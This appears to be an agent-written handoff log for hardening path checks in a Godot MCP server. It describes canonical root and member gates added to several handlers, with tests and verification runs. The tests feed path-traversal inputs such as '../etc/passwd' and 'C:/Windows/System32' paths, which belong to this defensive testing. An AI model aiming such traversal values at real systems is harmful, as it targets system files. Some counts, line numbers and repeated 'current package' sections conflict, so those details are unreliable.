# Godot MCP takeover handoff

- Timestamp: 2026-07-17 (tick T23)
- Worktree: `C:/Workspace/defkil/godot-mcp-wt-takeover`
- Branch: `refactor/core-hardening`
- Remote boundary: `origin=https://github.com/Defkil/godot-mcp.git`; nothing pushed or published.
- Current local package: repair the committed `handleAttachScript` PathPolicy gate so every downstream consumer receives the canonical project root, and normalize the handoff line endings so the committed range passes `git diff --check`.
- Current HEAD: read the full OID from `git log -1 --format=%H`; the handoff intentionally does not duplicate a self-referential hash.
- Previous reviewed documentation commit: `d00c4451cfd9a8443f12f70ee83814c476a73c63`; the final handoff commit is a separate descendant and did not amend it.
- Worktree requirement: clean after the repair commit; use `git status --porcelain` and `git log -1 --format=%H` as the authoritative current state.

## Current package — handleAttachScript canonical-root forwarding and line-ending repair

The previous handoff listed three lexical-`validatePath`-boundary
removals as deferred: the shared `headlessOp` lexical boundary at line
681 (deferred because it requires auditing every `headlessOp` caller
for handler-level ownership of the gate), `handleRunProject`
`args.scene` (runtime Godot CLI argument, not a filesystem path under
the project root), and the inner-loop lexical `validatePath(rel)`
check inside `handleValidateScripts` for `listChangedGdFiles` /
`listAllGdFiles` internal-relative paths (those paths are produced by
trusted internal scanners, not user input). All three remain
intentionally deferred.

This package closed the one remaining defense-in-depth lexical
boundary the audit surfaced: `handleAttachScript` was the only one of
the seven `headlessOp` callers that delegated straight to `headlessOp`
without its own `pathPolicy.assertProject(args.projectPath)` +
`pathPolicy.resolveProjectMember(projectRoot, ...)` handler-body
gate. The other six `headlessOp` callers (`handleCreateResource`,
`handleManageResource`, `handleManageSceneSignals`,
`handleManageThemeResource`, `handleManageSceneStructure`) all carry
the canonical-root + member-path contract from the
previous-tick packages. An outside-configured-allowed-roots
invocation of `handleAttachScript` reached `headlessOp` and either
failed the lexical check with a generic `'Invalid path.'` message or
escaped past it to the Godot spawn fallback. The takeover now applies
the same canonical-root enforcement plus a canonical-member
enforcement for `scenePath` and `scriptPath`, matching the sibling
`core_file_io` / `manage_shader` / `set_main_scene` /
`manage_translations` / `script-resource-handler` /
`manage_autoloads / manage_input_map / manage_export_presets` /
`info-scene-settings-handler` / `create_csharp_script /
validate_scripts` / `manage_scene_signals / manage_theme_resource /
manage_scene_structure` migration pattern exactly.

The package has two coherent changes:

1. **`src/server.ts`** — focused gate additions to `handleAttachScript`,
   matching the sibling `core_file_io` / `manage_shader` /
   `set_main_scene` / `manage_translations` /
   `manage_autoloads / manage_input_map / manage_export_presets` /
   `info-scene-settings-handler` / `script-resource-handler` /
   `manage_scene_signals / manage_theme_resource /
   manage_scene_structure` pattern exactly. Per-handler shape:

   - **`handleAttachScript`** — replaces the lexical `validatePath`
     boundary inside `headlessOp` (which `handleAttachScript`
     previously delegated straight through) with a handler-body
     gate: `pathPolicy.assertProject(args.projectPath)` followed by
     `pathPolicy.resolveProjectMember(projectRoot, args.scenePath)`
     and `pathPolicy.resolveProjectMember(projectRoot,
     args.scriptPath)`. Returns a typed `isError: true` envelope
     BEFORE the existing C# / .NET kind gate (which closes
     `Coding-Solo#114`) and BEFORE any `headlessOp` delegation when
     any of the three resolutions throws. The canonical
     `projectRoot` is used for both the `isDotnetProject` check and
     the downstream `headlessOp` delegation, so a non-canonical caller
     spelling cannot re-enter filesystem or subprocess code. The
     package preserves every existing strict-input gate: the
     script-kind regex on `scriptPath` (`.gd` / `.cs`), the
     C# / .NET kind gate, the `attach_script` op delegation, the
     `args` / `params` shape, and the success message.

   The original commit added 41 lines to the handler. The focused
   repair then routed the canonical `projectRoot` through the .NET
   detector and the `headlessOp` call. The diff adds no new helper
   modules, no new
   tests outside the focused test file, no schema changes, no
   handler signature changes, no capability policy changes, no
   BridgeClient changes, no `validatePath` lexical helper changes,
   and no changes to `headlessOp` itself, to the shared `validatePath`
   helper, or to any other handler.

2. **`tests/attach-script-handler-injection.test.ts`** (new, 6 tests)
   — exercises the real `GodotServer` + `PathPolicy` +
   `CapabilityPolicy` + the private handler method. Each test uses
   a temporary Godot project under the OS temp directory, removed
   in `afterEach`. The 6 tests cover:

   - **`handleAttachScript`** (6 tests): `projectPath` outside the
     configured allowed roots rejected with the canonical-root
     message AND the `Not a valid Godot project` fallback proven
     absent; `scenePath` `..` traversal rejected with the
     canonical-member message; `scriptPath` `..` traversal
     rejected; absolute-path `scenePath`
     (`C:/Windows/System32/notepad.exe`) rejected; absolute-path
     `scriptPath` (`C:/Windows/System32/evil.cs`) rejected with the
     canonical-member message BEFORE any `isDotnetProject` /
     `headlessOp` call; the happy-path regression supplies a
     non-canonical project-root spelling and proves the canonical root
     is forwarded to both .NET detection and `executeOperation`.

   Every `projectPath`-outside-roots rejection asserts the
   canonical-root error message (`outside the (configured )?allowed
   roots`) AND asserts the `Not a valid Godot project` fallback is
   *absent*, so the gate is proven to fire BEFORE any
   `existsSync(join(projectRoot, 'project.godot'))` check. Every
   `scenePath` / `scriptPath` `..`-traversal or absolute-path
   rejection asserts the canonical-member error message AND asserts
   the `Not a valid Godot project` fallback is *absent*, so the gate
   is proven to fire BEFORE any C# / .NET kind gate or `headlessOp`
   delegation.

   The script invokes the private handler method directly via
   `(server as any).handleAttachScript(args)` (bypassing
   `tools/call`), the same wiring pattern as the sibling
   `manage-scene-signals-theme-resource-scene-structure-handler-injection`
   gate, so the wire-level coverage proves the gate lives in the
   handler body itself, not only in the request-boundary guard.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, the C# / .NET kind gate that
  closes `Coding-Solo#114`, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner, the
  BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_*` gates, `core_file_io`, the
  `info-scene-settings-handler` / `script-resource-handler` /
  `manage-autoloads-input-map-export-presets-handler-injection` /
  `manage-scene-signals-theme-resource-scene-structure-handler-injection`
  / `create-project-csharp-script-validate-scripts-handler-injection`
  gates, `handleCreateResource`, `handleManageResource`,
  `handleManageSceneSignals`, `handleManageThemeResource`,
  `handleManageSceneStructure`, the inner-loop lexical
  `validatePath(rel)` check inside `handleValidateScripts`, the
  shared `headlessOp` lexical boundary at line 681, the lexical
  `validatePath(args.scene)` check inside `handleRunProject`, or
  any other handler;
- the only documented contract changes are that
  `args.projectPath` (canonical-root resolution, matching all seven
  sibling gates), `args.scenePath` (canonical-project-member
  resolution, matching the sibling `manage_scene_signals /
  manage_theme_resource / manage_scene_structure` /
  `set_main_scene` / `manage_translations` gates), and
  `args.scriptPath` (canonical-project-member resolution, matching
  the sibling `core_file_io` / `manage_shader` /
  `create_csharp_script` / `validate_scripts` gates) MUST now
  resolve through the canonical `PathPolicy`;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

**Rationale for the three remaining deferred handlers** (the same
three deferred by the previous handoff, still intentionally
retained):

- Shared `headlessOp` lexical boundary at line 681 — six of the
  seven `headlessOp` callers (`create_resource`, `manage_resource`,
  `manage_scene_signals`, `manage_theme_resource`,
  `manage_scene_structure`) now own their own handler-body gates;
  the seventh (`attach_script`) was closed by this package. The
  shared lexical boundary is therefore defensible as
  defense-in-depth but the audit still requires a regression-coverage
  pass against any future caller added without its own gate.
- `handleRunProject` `args.scene` — runtime Godot CLI argument, not
  a filesystem path under the project root.
- `handleValidateScripts` inner-loop `rel` lexical check at line
  7142 — `rel` is a relative path produced by
  `listChangedGdFiles` / `listAllGdFiles`, internal trusted input
  rather than user input.

Source evidence:

- `src/server.ts` is the only modified source file.
- `tests/attach-script-handler-injection.test.ts` (6 tests) is the
  only new test file.
- `docs/maintainers/issue-inventory.md` adds item 26 (the only docs
  edit).

## Verification on the package filesystem

- `npx vitest run tests/attach-script-handler-injection.test.ts`:
  1 file, 6 tests passed (RED 5/6 confirmed before the original gate;
  GREEN 6/6 after the gate and canonical-root forwarding repair).
- `npx vitest run tests/attach-script-handler-injection.test.ts
  tests/attach-script-dotnet-gate.test.ts`: 2 files, 10 tests
  passed (regression covers the existing C# / .NET kind gate that
  closes `Coding-Solo#114`).
- `npm test`: 49 files, 837 tests passed (was 831 before this
  package; +6 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check HEAD^..HEAD` exposed a real committed defect:
  the 196 lines added by the prior package used CRLF in the Git blob,
  so Git reported each as trailing whitespace. The repair normalizes
  only those newly added lines to LF in Git while preserving the
  historical handoff bytes; final  evidence below
  supersedes the stale claim.

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Current package — create_project / create_csharp_script / validate_scripts PathPolicy gate (sibling of tugcantopaloglu#9)

The previous handoff listed four remaining lexical-`validatePath`-gated
handlers as the next bounded package. Three of those
(`handleCreateProject`, `handleCreateCsharpScript`,
`handleValidateScripts` `args.scriptPaths`) carried a documented path
where canonical `PathPolicy` resolution could be adopted without a
separate audit; the fourth — the shared `headlessOp` lexical boundary
plus the inner-loop `handleValidateScripts` `rel` lexical check for
internal-relative paths — carries documented semantic differences that
defer its migration. This package closes the three simple project-only
gates in one cohesive commit.

Each migrated handler historically opened with a lexical
`validatePath(args.<path>)` boundary and then `join`-ed the
user-supplied value into `mkdirSync` / `writeFileSync` /
`existsSync`. The lexical `validatePath` only rejects empty /
`..`-prefixed / null-byte strings — it does not enforce the
canonical-roots list or canonical-member resolution. The
request-boundary `assertSafeToolPaths` guard already rejects every
canonical projectPath that would escape the configured `PathPolicy`
roots BEFORE the handler is called, so the runtime is not exposed to a
fresh escape. This package proves the same contract is enforced
*inside the handler body itself* by replacing the lexical boundary
with `pathPolicy.assertProject(args.projectPath)` (and, where
applicable, `pathPolicy.resolveProjectMember(projectRoot,
args.<member>)`) and returning a typed `isError: true` envelope
BEFORE any filesystem or subprocess call when either resolution
throws.

The package has three coherent changes:

1. **`src/server.ts`** — focused gate additions to the three handlers,
   matching the sibling `core_file_io` / `manage_shader` /
   `set_main_scene` / `manage_translations` / `manage_autoloads /
   manage_input_map / manage_export_presets` / `manage_layers /
   manage_plugins` / `info-scene-settings-handler` /
   `script-resource-handler` /
   `manage_scene_signals / manage_theme_resource /
   manage_scene_structure` pattern exactly. Per-handler shape:

   - **`handleCreateProject`** — replaces the lexical
     `validatePath(args.projectPath)` boundary with
     `pathPolicy.assertProject(args.projectPath)`. The canonical
     `projectRoot` is now used by `existsSync(projectRoot)`,
     `mkdirSync(projectRoot, { recursive: true })`,
     `join(projectRoot, 'project.godot')`,
     `writeFileSync(projectFile, content, 'utf8')`,
     `join(projectRoot, '${assemblyName}.csproj')`, and the
     `A project.godot already exists at this path: ${projectRoot}`
     error message. `handleCreateProject` is the only sibling handler
     whose target `args.projectPath` legitimately does not yet exist
     on disk; `pathPolicy.canonicalizeNearest` walks up to the nearest
     existing ancestor and prefixes the new segments, so
     `assertProject` canonicalizes a fresh path without losing the
     canonical-root contract.
   - **`handleCreateCsharpScript`** — same shape:
     `assertProject(args.projectPath)` followed by
     `resolveProjectMember(projectRoot, args.scriptPath)`. The
     canonical `projectRoot` is now used by `join(projectRoot,
     'project.godot')`, the `isDotnetProject(projectRoot)` check,
     and the `Not a valid Godot project: ${projectRoot}` error
     message. The canonical `scriptFull` is now used by
     `dirname(scriptFull)`, `mkdirSync(dir, { recursive: true })`,
     and `writeFileSync(scriptFull, source, 'utf8')`. The package
     preserves every existing strict-input gate: `scriptPath must
     end with .cs`, the `isValidCsharpIdentifier` file-base check,
     the `className === fileBase` invariant, and the success
     message.
   - **`handleValidateScripts`** — extends the existing
     `assertProject(args.projectPath)` gate (introduced in commit
     `b9fe537`) with a new canonical-member loop that calls
     `pathPolicy.resolveProjectMember(projectRoot, candidate)` for
     every explicit `args.scriptPaths` entry BEFORE any per-file
     `existsSync` / `runGdScriptCheck` call. Surfaces a typed
     `isError: true` envelope `Invalid scriptPath
     "${candidate}": ...` when the canonical-member contract fails.
     Internal-relative paths from `listChangedGdFiles` /
     `listAllGdFiles` continue to flow through the lexical
     `validatePath(rel)` check at line 7062 because they are
     produced by trusted internal scanners, not user input — that
     inner-loop migration is deferred.

   The diff is 95 insertions, 15 deletions across the three handlers
   (the four comments together consume ~30 lines of the insertion
   count). The diff adds no new helper modules, no new tests outside
   the focused test files, no schema changes, no handler signature
   changes, no capability policy changes, no BridgeClient changes,
   no `validatePath` lexical helper changes, and no changes to
   `headlessOp` itself.

2. **`tests/create-project-handler-injection.test.ts`** (new, 5 tests)
   — exercises the real `GodotServer` + `PathPolicy` +
   `CapabilityPolicy` + the private handler methods. Each test uses
   a temporary Godot project under the OS temp directory, removed
   in `afterEach`. The 5 tests cover:

   - **`create_project`** (2 tests): `projectPath` outside the
     configured allowed roots rejected for an outside-roots
     sibling-temp directory; absolute `projectPath` resolving
     outside the configured allowed roots rejected AND the handler
     does not create a `project.godot` inside the outside-roots
     sentinel directory.
   - **`create_csharp_script`** (3 tests): `projectPath` outside
     the configured allowed roots rejected for an outside-roots
     sibling-temp directory (with the `.NET project` fallback
     asserted *absent*); `scriptPath = 'res://../etc/passwd.cs'`
     rejected with a canonical-member error message; absolute
     `scriptPath = 'C:/Windows/System32/evil.cs'` rejected with a
     canonical-member error message BEFORE any `mkdirSync` /
     `writeFileSync` call.

   Every `projectPath`-outside-roots rejection asserts the
   canonical-root error message (`outside the (configured )?allowed
   roots`) AND asserts the relevant fallback (`A project.godot
   already exists`, `Failed to create project`, `Not a valid Godot
   project`, `Not a Godot .NET project`) is *absent*, so the gate is
   proven to fire BEFORE any filesystem reach. Every `scriptPath`
   canonical-member rejection asserts the canonical-member error
   message AND asserts the `create_csharp_script failed: ...`
   fallback is *absent*, so the gate is proven to fire BEFORE any
   `mkdirSync` / `writeFileSync`.

3. **`tests/validate-scripts-handler-injection.test.ts`** (new, 3
   tests) — exercises the real `GodotServer` + `PathPolicy` +
   `CapabilityPolicy` + the private handler method. Each test uses
   a temporary Godot project under the OS temp directory, removed
   in `afterEach`. The 3 tests cover:

   - **`validate_scripts`** (3 tests): `projectPath` outside the
     configured allowed roots rejected (regression — the existing
     pathPolicy gate is already correct); explicit `scriptPaths`
     absolute-path escape rejected with a typed canonical-member
     error message; explicit `scriptPaths` `..` traversal rejected.

   Every `projectPath`-outside-roots rejection asserts the
   canonical-root error message AND asserts the `Not a valid Godot
   project` fallback is *absent*. Every explicit `scriptPaths`
   canonical-member rejection asserts the canonical-member error
   message AND asserts the `Script does not exist` /
   `Not a valid .gd path` fallbacks are NOT the surface message
   (the gate fires before the per-file loop).

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner,
  the BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_*` gates, `core_file_io` /
  `info-scene-settings-handler-injection` /
  `script-resource-handler` /
  `manage-autoloads-input-map-export-presets-handler-injection` /
  `manage-scene-signals-theme-resource-scene-structure-handler-injection`
  gates, the shared `headlessOp` lexical boundary, or any other
  handler;
- the only documented contract changes are that
  `create_project.args.projectPath` (target may not exist yet) MUST
  now resolve through the canonical `PathPolicy`, that
  `create_csharp_script.args.scriptPath` MUST now resolve through
  `pathPolicy.resolveProjectMember`, and that explicit
  `validate_scripts.args.scriptPaths` entries MUST now resolve
  through `pathPolicy.resolveProjectMember`, matching the
  strict-input contract the sibling gates already enforce;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

**Rationale for the remaining deferred handlers:**

- Shared `headlessOp` lexical boundary (line 681) — deferred
  because it requires auditing every `headlessOp` caller for
  handler-level ownership of the gate; `attach_script` /
  `create_resource` / `manage_resource` already own their own
  gates.
- `handleRunProject` `args.scene` — runtime Godot CLI argument,
  not a filesystem path under the project root.
- `handleValidateScripts` inner-loop `rel` lexical check at line
  7062 — `rel` is a relative path produced by
  `listChangedGdFiles` / `listAllGdFiles`, internal trusted input
  rather than user input.

Source evidence:

- `src/server.ts` is the only modified source file.
- `tests/create-project-handler-injection.test.ts` (5 tests) and
  `tests/validate-scripts-handler-injection.test.ts` (3 tests)
  are the only new test files.
- `docs/maintainers/issue-inventory.md` adds item 25 (the only
  docs edit).

## Verification on the package filesystem

- `npx vitest run tests/create-project-handler-injection.test.ts
  tests/validate-scripts-handler-injection.test.ts`: 2 files, 8
  tests passed (RED 7/8 confirmed before the fix; GREEN 8/8 after
  the regex adjustment on `relative to the project root`).
- `npm test`: 48 files, 831 tests passed (was 823 before this
  package; +8 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Current package — manage_scene_signals / manage_theme_resource / manage_scene_structure PathPolicy gate (sibling of tugcantopaloglu#9)

The previous handoff listed seven remaining lexical-`validatePath`-gated
handlers as the next bounded package. Three of those
(`handleManageSceneSignals`, `handleManageThemeResource`,
`handleManageSceneStructure`) carry no semantic difference from the
`info / scene / settings / sprite / mesh-library / export` and
`manage_autoloads / manage_input_map / manage_export_presets` migration
patterns that landed in commits `446964b` and `571ef14`; the other four
(`handleCreateProject`, `handleCreateCsharpScript`,
`handleValidateScripts`, plus the `handleRunProject` `args.scene` runtime
CLI argument) carry documented semantic differences that defer their
migration. This package closes the three simple project-only gates in
one cohesive commit.

Each migrated handler historically delegated straight to the shared
`headlessOp` helper, which opens with
`if (!validatePath(projectPath)) return createErrorResponse('Invalid path.');`
and then `join(projectPath, 'project.godot')`-ed the user-supplied value
into `existsSync` / `readFileSync` / `writeFileSync`. The lexical
`validatePath` only rejects empty / `..`-prefixed / null-byte strings —
it does not enforce the canonical-roots list or canonical-member
resolution. The request-boundary `assertSafeToolPaths` guard already
rejects every canonical projectPath / memberPath that would escape the
configured `PathPolicy` roots BEFORE the handler is called, so the
runtime is not exposed to a fresh escape. This package proves the same
contract is enforced *inside the handler body itself* by replacing the
lexical boundary with `pathPolicy.assertProject(args.projectPath)` +
`pathPolicy.resolveProjectMember(projectRoot, args.scenePath | args.resourcePath)`
and returning a typed `isError: true` envelope (`Project path is outside
the configured allowed roots: ...` / `Invalid scenePath: Project member
path cannot traverse outside the project root.`) BEFORE any `headlessOp`
delegation when either resolution throws. The shared `headlessOp`
lexical boundary remains in place as redundant defense-in-depth and is
the next-follow-up refactor target (deferred because it requires
auditing every `headlessOp` caller for handler-level ownership of the
gate — `attach_script` / `create_resource` / `manage_resource` already
own their own gates, while the three handlers closed in this package
were the remaining unguarded delegation paths).

The package has two coherent changes:

1. **`src/server.ts`** — focused gate additions to the three handlers,
   matching the sibling `core_file_io` / `manage_shader` /
   `set_main_scene` / `manage_translations` /
   `manage_autoloads / manage_input_map / manage_export_presets` /
   `manage_layers / manage_plugins` / `info-scene-settings-handler` /
   `script-resource-handler` pattern exactly. Per-handler shape:

   - **`handleManageSceneSignals`** — replaces the inherited delegation
     to `headlessOp` with a handler-body gate:
     `pathPolicy.assertProject(args.projectPath)` followed by
     `pathPolicy.resolveProjectMember(projectRoot, args.scenePath)`.
     Returns a typed `isError: true` envelope BEFORE any `headlessOp`
     delegation when either resolution throws. The original `headlessOp`
     delegation, the `args` / `params` shape, the optional `signalName`
     / `sourcePath` / `targetPath` / `method` parameters, and the strict
     required-field gate (`projectPath`, `scenePath`, `action`) are all
     preserved unchanged.
   - **`handleManageThemeResource`** — same shape:
     `assertProject(args.projectPath)` followed by
     `resolveProjectMember(projectRoot, args.resourcePath)`. The
     `headlessOp` delegation, the `resourcePath` / `action` / optional
     `properties` params shape, and the strict required-field gate
     (`projectPath`, `resourcePath`, `action`) are preserved unchanged.
   - **`handleManageSceneStructure`** — same shape:
     `assertProject(args.projectPath)` followed by
     `resolveProjectMember(projectRoot, args.scenePath)`. The
     `headlessOp` delegation, the `scenePath` / `action` / `nodePath` /
     optional `newName` / `newParentPath` params shape, and the strict
     required-field gate (`projectPath`, `scenePath`, `action`,
     `nodePath`) are preserved unchanged.

   The diff is 66 insertions, 0 deletions across the three handlers.
   The diff adds no new helper modules, no new tests outside the
   focused test file, no schema changes, no handler signature changes,
   no capability policy changes, no BridgeClient changes, no `validatePath`
   lexical helper changes, and no changes to `headlessOp` itself.

2. **`tests/manage-scene-signals-theme-resource-scene-structure-handler-injection.test.ts`**
   (new, 6 tests) — exercises the real `GodotServer` + `PathPolicy` +
   `CapabilityPolicy` + the private handler methods. Each test uses
   a temporary Godot project under the OS temp directory, removed
   in `afterEach`. The 6 tests cover:

   - **`manage_scene_signals`** (2 tests): `projectPath` outside the
     configured allowed roots rejected for `list`; `scenePath` whose
     canonical realpath would escape the project root via `..` traversal
     rejected with a member-path error.
   - **`manage_theme_resource`** (2 tests): `projectPath` outside the
     configured allowed roots rejected for `read`; `resourcePath` whose
     canonical realpath would escape the project root via `..`
     traversal rejected with a member-path error.
   - **`manage_scene_structure`** (2 tests): `projectPath` outside the
     configured allowed roots rejected for `list`; `scenePath` whose
     canonical realpath would escape the project root via `..`
     traversal rejected with a member-path error.

   Every `projectPath`-outside-roots rejection asserts the
   canonical-root error message (`outside the (configured )?allowed
   roots`) AND asserts the `Not a valid Godot project` fallback is
   *absent*, so the gate is proven to fire BEFORE any
   `existsSync(project.godot)` check. Every `scenePath` / `resourcePath`
   `..`-traversal rejection asserts the canonical-member error message
   (`cannot traverse outside the project root`) AND asserts the
   `Godot failed to start` spawn fallback is *absent*, so the gate is
   proven to fire BEFORE any `headlessOp` delegation.

   The script invokes the private handler methods directly via
   `(server as any).handleXxx(args)` (bypassing `tools/call`), the
   same wiring pattern as
   `tests/info-scene-settings-handler-injection.test.ts`, so the gate
   exercises the live handler dispatch path, not a side-stepped import.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner,
  the BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_*` gates, `handleCreateCsharpScript`,
  `handleCreateProject`, `handleManageAutoloads`,
  `handleManageInputMap`, `handleManageExportPresets`,
  `handleValidateScripts`, `handleAttachScript`, the shared
  `headlessOp` lexical boundary, or any other handler;
- the only documented contract changes are that `args.projectPath`
  MUST now resolve through the canonical `PathPolicy` and that
  `args.scenePath` / `args.resourcePath` MUST now resolve through
  `pathPolicy.resolveProjectMember`, matching the strict-input
  contract the sibling `core_file_io` / `manage_shader` /
  `set_main_scene` / `manage_translations` /
  `manage_autoloads / manage_input_map / manage_export_presets` /
  `manage_layers / manage_plugins` / `info-scene-settings-handler` /
  `script-resource-handler` gates already enforce;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

**Rationale for the four deferred handlers:**

- `handleRunProject` `args.scene` — runtime Godot CLI argument, not
  a filesystem path under the project root.
- `handleCreateProject` — the target path does not yet exist;
  `assertProject` canonicalization requires an existing path. The
  handler needs a separate `allowsProject` (rather than
  `assertProject`) gate plus a downstream write-gate that prevents
  the new path from leaking outside the configured allowed roots.
- `handleCreateCsharpScript` — the new script path does not yet
  exist; same canonicalization mismatch as `handleCreateProject`.
  The C# gate from Coding-Solo#114 remains the primary gate for
  this handler.
- `handleValidateScripts` — carries the same lexical boundary on
  `rel` (a relative path produced by `listChangedGdFiles` /
  `listAllGdFiles`) and needs a separate audit because explicit
  `args.scriptPaths` user input requires a `resolveProjectMember`
  gate that is not currently applied. The inner-loop lexical
  `validatePath(rel)` check at line 7062 is the next layer of
  defense and needs the same canonical-member migration.

Source evidence:

- `src/server.ts` is the only modified source file.
- `tests/manage-scene-signals-theme-resource-scene-structure-handler-injection.test.ts`
  is the only new test file (6 tests).
- `docs/maintainers/issue-inventory.md` item 24 is the only docs
  edit.

## Verification on the package filesystem

- `npx vitest run tests/manage-scene-signals-theme-resource-scene-structure-handler-injection.test.ts`:
  1 file, 6 tests passed (RED 6/6 confirmed before the fix;
  GREEN 6/6 after).
- `npm test`: 46 files, 823 tests passed (was 817 before this
  package; +6 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0; the only emitted warning is
  the standard Windows `core.autocrlf=true` notice for the
  modified `src/server.ts` and `docs/maintainers/issue-inventory.md`
  line-ending refresh, which the sibling packages on this branch
  also emit).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Previous package — manage_autoloads / manage_input_map / manage_export_presets PathPolicy gate (sibling of tugcantopaloglu#9)

(For history; superseded by the current package above. Retained so the
diff between the two adjacent sibling-gate packages remains auditable.)

The previous handoff listed the seven remaining lexical-`validatePath`-gated
file-mutation handlers as the next bounded package. Three of those
(`handleManageAutoloads`, `handleManageInputMap`, `handleManageExportPresets`)
carry no semantic difference from the `info / scene / settings / sprite /
mesh-library / export` migration pattern that landed in commit `446964b`;
the other four (`handleCreateProject`, `handleCreateCsharpScript`,
`handleValidateScripts`, plus the `handleRunProject` `args.scene` runtime
CLI argument) carry documented semantic differences that defer their
migration. This package closes the three simple project-only gates in
one cohesive commit.

## Current package — manage_autoloads / manage_input_map / manage_export_presets PathPolicy gate (sibling of tugcantopaloglu#9)

The previous handoff listed the seven remaining lexical-`validatePath`-gated
file-mutation handlers as the next bounded package. Three of those
(`handleManageAutoloads`, `handleManageInputMap`, `handleManageExportPresets`)
carry no semantic difference from the `info / scene / settings / sprite /
mesh-library / export` migration pattern that landed in commit `446964b`;
the other four (`handleCreateProject`, `handleCreateCsharpScript`,
`handleValidateScripts`, plus the `handleRunProject` `args.scene` runtime
CLI argument) carry documented semantic differences that defer their
migration. This package closes the three simple project-only gates in
one cohesive commit.

Each migrated handler historically opened with
`if (!validatePath(args.projectPath)) return createErrorResponse('Invalid path.');`
and then `join(args.projectPath, 'project.godot')`-ed the user-supplied
value into `existsSync` / `readFileSync` / `writeFileSync`. The lexical
`validatePath` only rejects empty / `..`-prefixed / null-byte strings —
it does not enforce the canonical-roots list or canonical-member
resolution. The request-boundary `assertSafeToolPaths` guard already
rejects every canonical projectPath that would escape the configured
`PathPolicy` roots BEFORE the handler is called, so the runtime is not
exposed to a fresh escape. This package proves the same contract is
enforced *inside the handler body itself* by replacing the lexical
boundary with `pathPolicy.assertProject(args.projectPath)` and
returning a typed `isError: true` envelope (`Project path is outside
the configured allowed roots: ...`) BEFORE any filesystem or
subprocess call when the assertion throws. The canonical `projectRoot`
is then used for `join(projectRoot, 'project.godot')`,
`join(projectRoot, 'export_presets.cfg')`, the
`existsSync` / `readFileSync` / `writeFileSync` calls, and the
`Not a valid Godot project: ${projectRoot}` error message so the
operator sees the resolved canonical path.

The package has two coherent changes:

1. **`src/server.ts`** — focused gate additions to the three handlers,
   matching the sibling `core_file_io` / `manage_shader` /
   `set_main_scene` / `manage_translations` / `script-resource-handler` /
   `info-scene-settings-handler-injection` pattern exactly. Per-handler
   shape:

   - **`handleManageAutoloads`** — replaces lexical `validatePath` on
     `args.projectPath` with `pathPolicy.assertProject(args.projectPath)`.
     The canonical `projectRoot` is now used by `join(projectRoot,
     'project.godot')`, `existsSync(projectFile)`,
     `readFileSync(projectFile, 'utf8')`, `writeFileSync(projectFile,
     content, 'utf8')`, and the `Not a valid Godot project` error message.
     Every existing strict-input gate (strict identifier regex on `name`,
     strict `res://` + relative-member gate on `path`, anchored per-line
     `remove` regex) is preserved unchanged.
   - **`handleManageInputMap`** — same shape: `assertProject` on
     `args.projectPath`; the canonical `projectRoot` is used by
     `join(projectRoot, 'project.godot')`, `existsSync(projectFile)`,
     `readFileSync(projectFile, 'utf8')`,
     `writeFileSync(projectFile, content, 'utf8')`, and the
     `Not a valid Godot project` error message. Every existing
     strict-input gate (strict identifier regex on `actionName`,
     anchored per-line `remove` regex) is preserved unchanged.
   - **`handleManageExportPresets`** — same shape: `assertProject` on
     `args.projectPath`; the canonical `projectRoot` is used by
     `join(projectRoot, 'project.godot')`,
     `join(projectRoot, 'export_presets.cfg')`, `existsSync(projectFile)`,
     `readFileSync(presetsFile, 'utf8')`,
     `writeFileSync(presetsFile, content, 'utf8')`, and the
     `Not a valid Godot project` error message. Every existing
     strict-input gate (strict identifier regex on `name`, the
     `/^[A-Za-z][A-Za-z0-9 _.\-/]*$/` allowlist on `platform`,
     anchored `[preset.N]` `remove` regex) is preserved unchanged.

   The diff is 50 insertions, 13 deletions across the three handlers.
   The diff adds no new helper modules, no new tests outside the
   focused test file, no schema changes, no handler signature changes,
   no capability policy changes, no BridgeClient changes, and no
   `validatePath` lexical helper changes.

2. **`tests/manage-autoloads-input-map-export-presets-handler-injection.test.ts`**
   (new, 6 tests) — exercises the real `GodotServer` + `PathPolicy` +
   `CapabilityPolicy` + the private handler methods. Each test uses
   a temporary Godot project under the OS temp directory, removed
   in `afterEach`. The 6 tests cover:

   - **`manage_autoloads`** (2 tests): `projectPath` outside the
     configured allowed roots rejected for `list` AND for `add`.
   - **`manage_input_map`** (2 tests): `projectPath` outside the
     configured allowed roots rejected for `list` AND for `add`.
   - **`manage_export_presets`** (2 tests): `projectPath` outside the
